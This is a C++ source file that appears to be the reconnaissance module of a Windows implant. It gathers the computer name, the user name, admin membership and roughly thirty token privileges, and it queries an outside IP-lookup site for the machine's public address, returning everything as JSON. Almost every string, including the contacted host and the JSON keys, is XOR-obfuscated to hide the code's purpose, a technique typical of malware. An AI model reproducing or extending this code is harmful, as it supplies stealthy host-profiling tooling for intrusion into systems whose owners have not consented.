#include "GatherInfo.h"
#include "xor.h"


int KEY = 0x16;

/* Grabs Computer Name 
Using Windows Api 
https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea
*/
string getComputerName() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD cchBufferSize = sizeof(buffer) / sizeof(buffer[0]);
    if (!GetComputerNameA(buffer, &cchBufferSize))
        throw runtime_error(xor_string("QsbUy{fcbsdXw{s>?6pwzsr8", KEY).c_str());
    return string(&buffer[0]);
}

/* Grabs User Name
using Windows API

https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea
 */
string getUserName() {
    char buffer[257] = {0};
    DWORD cchBufferSize = sizeof(buffer) / sizeof(buffer[0]);
    if (!GetUserNameA(buffer, &cchBufferSize))
        throw runtime_error(xor_string("QsbCesdXw{s>?6pwzsr8", KEY).c_str());
    return string(&buffer[0]);
}

//https://stackoverflow.com/questions/56043589/how-to-recover-privileges-with-gettokeninformation-c
//This function checks if the current user has a specific privilege
BOOL CheckWindowsPrivilege(const TCHAR* Privilege)
{
    LUID luid;
    PRIVILEGE_SET privs;
    HANDLE hProcess;
    HANDLE hToken;
    // Get the current process token handle so we can get the privilege.
    hProcess = GetCurrentProcess();
    // Get a token for this process.
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
    // Get the LUID for the privilege.
    if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
    privs.PrivilegeCount = 1;
    privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privs.Privilege[0].Luid = luid;
    privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bResult;
    // Check to see if the token has the privilege.
    PrivilegeCheck(hToken, &privs, &bResult);
    return bResult;
}


//https://learn.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership?redirectedfrom=MSDN
//This function checks if the current user is an admin
BOOL IsUserAdmin()
{
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    // Initialize SID.
    b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup);
    if (b)
    {
        // Check whether the token is present in admin group.
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
        {
            b = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    return(b);
}

/* Calls IsUserAdmin and CheckWindowsPrivilege to output
the array of arrays*/
std::string checkPrivileges() {
    vector<pair<string, bool>> privileges;
    xor_string("4pwzes4:", KEY);
    
    privileges.push_back(make_pair(xor_string("ESIWEE_QXFD_[WDOBY]SXIXW[S", KEY), CheckWindowsPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME)));
    privileges.push_back(make_pair(xor_string("ESI_XUDSWESIGCYBWIXW[S", KEY), CheckWindowsPrivilege(SE_INCREASE_QUOTA_NAME)));
    privileges.push_back(make_pair(xor_string("ESITWU]CFIXW[S", KEY), CheckWindowsPrivilege(SE_BACKUP_NAME)));
    privileges.push_back(make_pair(xor_string("ESIU^WXQSIXYB_POIXW[S", KEY), CheckWindowsPrivilege(SE_CHANGE_NOTIFY_NAME)));
    privileges.push_back(make_pair(xor_string("ESIUDSWBSIQZYTWZIXW[S", KEY), CheckWindowsPrivilege(SE_CREATE_GLOBAL_NAME)));
    privileges.push_back(make_pair(xor_string("ESIUDSWBSIFWQSP_ZSIXW[S", KEY), CheckWindowsPrivilege(SE_CREATE_PAGEFILE_NAME)));
    privileges.push_back(make_pair(xor_string("ESIUDSWBSIEO[TYZ_UIZ_X]IXW[S", KEY), CheckWindowsPrivilege(SE_CREATE_SYMBOLIC_LINK_NAME)));
    privileges.push_back(make_pair(xor_string("ESIUDSWBSIBY]SXIXW[S", KEY), CheckWindowsPrivilege(SE_CREATE_TOKEN_NAME)));
    privileges.push_back(make_pair(xor_string("ESIRSTCQIXW[S", KEY), CheckWindowsPrivilege(SE_DEBUG_NAME)));
    //privileges.push_back(make_pair(string("SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME"), CheckWindowsPrivilege(SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME)));
    privileges.push_back(make_pair(xor_string("ESISXWTZSIRSZSQWB_YXIXW[S", KEY), CheckWindowsPrivilege(SE_ENABLE_DELEGATION_NAME)));
    privileges.push_back(make_pair(xor_string("ESI_[FSDEYXWBSIXW[S", KEY), CheckWindowsPrivilege(SE_IMPERSONATE_NAME)));
    privileges.push_back(make_pair(xor_string("ESI_XUITWESIFD_YD_BOIXW[S", KEY), CheckWindowsPrivilege(SE_INC_BASE_PRIORITY_NAME)));
    privileges.push_back(make_pair(xor_string("ESI_XUIAYD]_XQIESBIXW[S", KEY), CheckWindowsPrivilege(SE_INC_WORKING_SET_NAME)));
    privileges.push_back(make_pair(xor_string("ESIZYWRIRD_@SDIXW[S", KEY), CheckWindowsPrivilege(SE_LOAD_DRIVER_NAME)));
    privileges.push_back(make_pair(xor_string("ESIZYU]I[S[YDOIXW[S", KEY), CheckWindowsPrivilege(SE_LOCK_MEMORY_NAME)));
    privileges.push_back(make_pair(xor_string("ESI[WU^_XSIWUUYCXBIXW[S", KEY), CheckWindowsPrivilege(SE_MACHINE_ACCOUNT_NAME)));
    privileges.push_back(make_pair(xor_string("ESI[WXWQSI@YZC[SIXW[S", KEY), CheckWindowsPrivilege(SE_MANAGE_VOLUME_NAME)));
    privileges.push_back(make_pair(xor_string("ESIFDYPIE_XQZSIFDYUSEEIXW[S", KEY), CheckWindowsPrivilege(SE_PROF_SINGLE_PROCESS_NAME)));
    privileges.push_back(make_pair(xor_string("ESIDSZWTSZIXW[S", KEY), CheckWindowsPrivilege(SE_RELABEL_NAME)));
    privileges.push_back(make_pair(xor_string("ESIDS[YBSIE^CBRYAXIXW[S", KEY), CheckWindowsPrivilege(SE_REMOTE_SHUTDOWN_NAME)));
    privileges.push_back(make_pair(xor_string("ESIDSEBYDSIXW[S", KEY), CheckWindowsPrivilege(SE_RESTORE_NAME)));
    privileges.push_back(make_pair(xor_string("ESIESUCD_BOIXW[S", KEY), CheckWindowsPrivilege(SE_SECURITY_NAME)));
    privileges.push_back(make_pair(xor_string("ESIE^CBRYAXIXW[S", KEY), CheckWindowsPrivilege(SE_SHUTDOWN_NAME)));
    privileges.push_back(make_pair(xor_string("ESIEOXUIWQSXBIXW[S", KEY), CheckWindowsPrivilege(SE_SYNC_AGENT_NAME)));
    privileges.push_back(make_pair(xor_string("ESIEOEBS[ISX@_DYX[SXBIXW[S", KEY), CheckWindowsPrivilege(SE_SYSTEM_ENVIRONMENT_NAME)));
    privileges.push_back(make_pair(xor_string("ESIEOEBS[IFDYP_ZSIXW[S", KEY), CheckWindowsPrivilege(SE_SYSTEM_PROFILE_NAME)));
    privileges.push_back(make_pair(xor_string("ESIEOEBS[B_[SIXW[S", KEY), CheckWindowsPrivilege(SE_SYSTEMTIME_NAME)));
    privileges.push_back(make_pair(xor_string("ESIBW]SIYAXSDE^_FIXW[S", KEY), CheckWindowsPrivilege(SE_TAKE_OWNERSHIP_NAME)));
    privileges.push_back(make_pair(xor_string("ESIBUTIXW[S", KEY), CheckWindowsPrivilege(SE_TCB_NAME)));
    privileges.push_back(make_pair(xor_string("ESIB_[SILYXSIXW[S", KEY), CheckWindowsPrivilege(SE_TIME_ZONE_NAME)));
    privileges.push_back(make_pair(xor_string("ESIBDCEBSRIUDSR[WXIWUUSEEIXW[S", KEY), CheckWindowsPrivilege(SE_TRUSTED_CREDMAN_ACCESS_NAME)));
    privileges.push_back(make_pair(xor_string("ESICXRYU]IXW[S[WXIWUUSEEIXW[S", KEY), CheckWindowsPrivilege(SE_UNDOCK_NAME)));
    std::string result = "";
    for (auto p : privileges) {
        result += "\"" + p.first + "\":";
        if (p.second) result += xor_string("4bdcs4:", KEY);
        else result += xor_string("4pwzes4:", KEY);
    }
    return result;
}

std::string real_ip() {
	std::string output;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	std::vector<std::string> vFileContent;
	HINTERNET hSession = WinHttpOpen(xor_wstring(L"_F6dsbds`sd", KEY).c_str(),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		std::cout << "hSession";
	}
	HINTERNET hConnect = WinHttpConnect(hSession, xor_wstring(L"{osnbsdxwzf8uy{", KEY).c_str(),
		INTERNET_DEFAULT_HTTP_PORT, 0);
	if (!hConnect) {
		std::cout << "hConnect";
	}
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, xor_wstring(L"QSB", KEY).c_str(), xor_wstring(L"9dwa", KEY).c_str(),
		NULL, WINHTTP_NO_REFERER,
		NULL,
		0);
	if (!hRequest) {
	}
	WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0, WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);
	WinHttpReceiveResponse(hRequest, NULL);
	dwSize = 0;
	WinHttpQueryDataAvailable(hRequest, &dwSize);
	pszOutBuffer = new char[dwSize + 1];

	WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
		dwSize, &dwDownloaded);
	output = pszOutBuffer;
	output.resize(dwDownloaded, 0);
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return output;
}

/* Calls all of the above functions in one location in a json format*/
json GetAll(){
    json res;
    const string compName = getComputerName();
    const string userName = getUserName();
    const string ipName = real_ip();
    //vector<string>ipName = getIP();
    //cout << compName << endl;
    //cout << userName << endl;
    //cout << ipName << endl;
    //cout << IsUserAnAdmin() << endl;
    //vector<pair<string, bool>> p( checkPrivileges());
    const string p = checkPrivileges();
    /*
    for(pair<string, bool> p : checkPrivileges()) {
        cout << p.first << ": " << p.second << endl;
    }
    */
    res[xor_string("9dwa", KEY)] = compName;
    res[xor_string("cesdXw{s", KEY)] = userName;
    res[xor_string("Fd`zsqse", KEY)] = p;
   res[xor_string("fXw{s", KEY)] = ipName;
    return res;

}



/*


NEED TO ADD IN MORE FUNCTIONS HERE


*/
//   int main() {
//         GetAll();
//   }

